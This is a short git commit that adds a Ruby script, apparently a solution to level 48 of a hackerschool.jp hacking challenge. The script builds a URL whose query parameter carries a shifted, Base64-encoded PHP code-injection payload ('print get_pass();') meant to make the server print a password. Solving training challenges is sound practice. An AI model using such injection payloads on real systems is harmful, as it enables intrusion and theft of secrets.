5626fd7b1c28a4031421b4c1abfe1f618bf848e5
cielavenir <cielartisan@gmail.com>
2013-06-05 00:45:44 +0900

    8946 take48

---
+++ tyama_8946take48.rb
@@ -0,0 +1,4 @@
+#!/usr/bin/ruby
+require 'base64'
+puts 'Open URL:'
+puts 'http://www.hackerschool.jp/hack/take48.php?no='+Base64.encode64('print get_pass();'.each_byte.map{|e|(e+(e>0x60?5:0)).chr}*'')
